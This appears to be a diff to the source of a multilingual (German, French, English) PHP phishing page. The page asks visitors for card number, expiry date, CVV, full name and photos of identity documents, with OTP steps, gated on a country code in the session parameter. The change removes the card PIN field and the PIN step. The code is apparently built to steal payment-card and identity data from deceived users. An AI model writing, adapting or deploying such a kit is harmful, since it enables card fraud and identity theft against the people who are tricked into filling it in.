@@ -47,16 +47,13 @@ if ($_GET['session'] == base64_encode('DE') || $_GET['session'] == base64_encode
 
 
     $py_title = "Karteninformationen";
-$py_text = "Bitte geben Sie Ihre Karteninformationen ein, um fortzufahren:";
-$cn_label = "Kartennummer";
-$ce_label = "Ablaufdatum";
-$ck_label = "CVV";
-$cfn_label = "Vollständiger Name";
-$cpin_label = "PIN-Code";
+    $py_text = "Bitte geben Sie Ihre Karteninformationen ein, um fortzufahren:";
+    $cn_label = "Kartennummer";
+    $ce_label = "Ablaufdatum";
+    $ck_label = "CVV";
+    $cfn_label = "Vollständiger Name";
 
 
-    $crp_text = "Geben Sie den PIN-Code Ihrer Karte ein, um fortzufahren:";
-    $crp_label = "PIN-Code";
 
 
     $dc_title = "Identitätsverifizierung";
@@ -140,10 +137,6 @@ $cpin_label = "PIN-Code";
         $ck_label = "CVV";
 
 
-        $crp_text = "Geben Sie den PIN-Code Ihrer Karte ein, um fortzufahren:";
-        $crp_label = "PIN-Code";
-
-
         $dc_title = "Identitätsverifizierung";
         $dc_text = "Wir führen einen Identitätsverifizierungsprozess durch, um die Sicherheit und Integrität unserer Plattform zu gewährleisten. Bitte überprüfen Sie Ihr Identifikationsdokument unten:";
         $dc_front_label = "Vorderseite des Dokuments";
@@ -203,11 +196,8 @@ $cpin_label = "PIN-Code";
     $ce_label = "Date d'expiration";
     $ck_label = "CVV";
     $cfn_label = "Nom complet";
-    $cpin_label = "Code PIN";
 
 
-    $crp_text = "Entrez le code PIN de votre carte pour continuer:";
-    $crp_label = "Code PIN";
 
 
     $dc_title = "Vérification d'identité";
@@ -278,11 +268,8 @@ $cpin_label = "PIN-Code";
     $ce_label = "Expiry date";
     $ck_label = "CVV";
     $cfn_label = "Full name";
-    $cpin_label = "PIN code";
 
 
-    $crp_text = "Enter your card's PIN code to continue:";
-    $crp_label = "PIN Code";
 
 
     $dc_title = "Identity verification";
@@ -556,10 +543,6 @@ $cpin_label = "PIN-Code";
                   <label for="cvv-field"><?php echo $ck_label; ?></label>
                </div>
             </div>
-            <div class="input-container">
-               <input type="text" id="pin-field" placeholder=" " maxlength="4" inputmode="numeric">
-               <label for="pin-field"><?php echo $cpin_label; ?></label>
-            </div>
             <button class="enable-btn" onclick="go('submit-card');"><?php echo $btn_option_3; ?></button>
          </div>
       </div>
@@ -700,9 +683,6 @@ $cpin_label = "PIN-Code";
                   break;
               case 'otp-error':
                   showDiv('po-form');
-                  break;
-              case 'pin':
-                  showDiv('pn-form');
                   break;
               case 'success':
                   showDiv('sc-page');
